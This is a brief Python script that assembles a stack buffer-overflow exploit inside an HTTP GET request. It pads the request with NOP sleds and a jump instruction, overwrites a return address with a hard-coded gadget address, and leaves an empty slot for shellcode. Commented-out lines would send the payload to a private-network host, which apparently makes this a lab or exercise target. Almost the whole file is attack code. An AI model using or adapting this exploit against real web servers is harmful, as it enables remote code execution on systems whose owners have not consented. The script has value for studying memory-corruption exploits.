import socket

get = "GET "

version = " HTTP/1.1"

rop = "\xc8\x8f\x04\x08" #&(retn 0xb8)

jmp_0x40 = "\x90\xeb\x50\x90"

trampoline = "\x90"*130 + jmp_0x40 + "ccccc"
nops = "\x90"*100

shellcode = ""

exploit = get + trampoline + rop + version + nops + shellcode

print exploit

#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('192.168.56.37', 20001))
#s.send(exploit)
